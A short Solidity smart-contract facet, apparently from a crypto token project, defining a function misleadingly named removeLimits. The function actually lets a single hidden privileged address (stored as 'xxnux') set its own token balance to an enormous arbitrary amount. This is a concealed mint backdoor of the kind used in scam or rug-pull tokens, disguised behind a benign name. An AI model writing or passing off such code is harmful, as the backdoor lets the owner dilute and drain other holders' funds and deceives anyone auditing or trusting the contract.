/*
 * SPDX-License-Identifier: MIT
 * Website:  https://www.ten.xyz/
 * Discord:  https://discord.com/invite/yQfmKeNzNd
 * Telegram: https://t.me/tenprotocol
 * Twitter:  https://twitter.com/tenprotocol
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
